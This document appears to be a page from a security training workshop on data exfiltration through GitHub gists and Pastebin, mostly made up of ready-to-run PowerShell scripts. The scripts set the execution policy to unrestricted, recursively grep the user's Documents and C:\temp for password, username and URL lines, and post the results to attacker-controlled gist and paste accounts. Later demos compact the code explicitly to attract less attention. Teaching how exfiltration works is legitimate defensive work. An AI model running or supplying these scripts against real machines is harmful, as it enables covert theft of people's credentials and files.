---
layout: default
title: Data Exfiltration using Github
nav_order: 16
---
# Github First demo

Go to the folder where you previously created logindata.ps1 and create a new file called `new-github.ps1` with the code below. Open your terminal and run new-github.ps1 (don't doubleclick in windows, run it via the Powershell terminal)

You might have to launch powershell as administrator first to change the set-executionpolicy to "unrestricted"

```powershell
set-executionpolicy unrestricted
```

1. Observe the results. You will see an URL
2. Visit this URL

```powershell
#Demo 1, github requires your Fine-grained personal access token
. .\logindata.ps1
$Content = Invoke-WebRequest -Uri "https://ipinfo.io/json"

. .\logindata.ps1
$Content = Invoke-WebRequest -Uri "https://ipinfo.io/json"

$body = @{
    description = "Uploading a first gist to github"
    public      = $false
    files       = @{
        "snippet.txt" = @{
            content = $Content.Content
        }
    }
} | ConvertTo-Json

Invoke-WebRequest `
  -Uri "https://api.github.com/gists" `
  -Method POST `
  -Headers @{
    "Authorization" = "Bearer $FGPAT"
    "X-GitHub-Api-Version" = "2022-11-28"
  } `
  -Body $body `
  -ContentType "application/json" `
  -outfile results.txt

```
You should have some feedback, corresponding more or less with the following output:

![Feedback](../images/Githubdemo1-1.png)

And in your gists online, you should also see some structured output:

![Contents of your gists](../images/Githubdemo1.png)
You might encounter an error related to the "internet explorer engine", if that's the case: launch internet explorer and click through the initial setup.

![Internet Explorer first setup](../images/IE11.png)

This should fix your issue.

### Create some dummy files
For demo purposes we're going to create 2 dummy files: `password.txt` and `secrets.txt` Create a temp folder on your harddisk (if none exist) and put these 2 files in it folder: `C:\temp`

password.txt has the following contents
```powershell

PUT THIS FILE IN C:\temp
I do silly things like sometimes putting passwords in files.

```
secret.txt has the following contents
```
PUT THIS FILE IN C:\temp

this is my secret file
my password for example.com is Kameham3ha!
my username for example.com is ThebrokeShadower
https://www.example.com/login-or-something
```
# Github second demo
Create a new file called "new-github2.ps1" and copy paste the following data in it:
```powershell

#Demo 2, let's grab some passwords from local files!
. .\logindata.ps1
$Content = ls c:\temp -r | Select-String password,username,http | select line,path
$ContentString = $Content | ForEach-Object { "$($_.path): $($_.line)" } | Out-String

$Description = "Github second demo"

$body = @{
    description = $Description
    public      = $false
    files       = @{
        "secrets.txt" = @{
            content = $ContentString
        }
    }
} | ConvertTo-Json -Depth 4

Invoke-WebRequest `
  -Uri "https://api.github.com/gists" `
  -Method POST `
  -Headers @{
    "Authorization" = "Bearer $FGPAT"
    "X-GitHub-Api-Version" = "2022-11-28"
  } `
  -Body $body `
  -ContentType "application/json" `
  -OutFile results.txt


```
Execute new-github2.ps1 from the terminal. If all goes well, you will have this gist under your personal account on the github website.

![Github demo 2](../images/githubdemo2.png)


# Pastebin third demo

Powershell stores the data in an object. Which is not bad but invoke-webrequest doesn’t understand it and thus the parsing is bad.
Let’s convert the data to a format which will work.
Create new-pastebin3.ps1 and observe the difference with new-pastebin2.ps1
```powershell
. .\logindata.ps1
$Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path)
$Title      =   "pastebin3"

$Body = @{ 
    api_dev_key         = $DevKey;
    api_user_key        = $UserKey;
    api_paste_name	    = $Title;
    api_paste_code      = $Content;
    api_paste_private   = "2"; # 0=public 1=unlisted 2=private
    api_option          = "paste";
    }

Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
```


Now launch new-pastebin3.ps1 from the terminal.
Observe the results in your pastebin.com account

# Pasebin fourth demo
We want to generate a bit less attention so we will try to have less lines of code on our screen.
Luckily, we can do this by using “;” in powershell
Create new-pastebin4.ps1 and new-pastebin5.ps1

new-pastebin4.ps1
```powershell
. .\logindata.ps1
$Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path); $Title="pastebin4"
$Body = @{ api_dev_key=$DevKey; api_user_key=$UserKey; api_paste_name=$Title;api_paste_code=$Content;api_paste_private="2";api_option="paste";}
Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
```
new-pastebin5.ps1
```powershell
$DevKey="PUT-DEVKEY-HERE";$UserKey="PUT-USER-KEY-HERE"
$Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path); $Title="pastebin5"
$Body = @{ api_dev_key=$DevKey; api_user_key=$UserKey; api_paste_name=$Title;api_paste_code=$Content;api_paste_private="2";api_option="paste";}
Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
```
Observe the concatenation done in those 2 files.

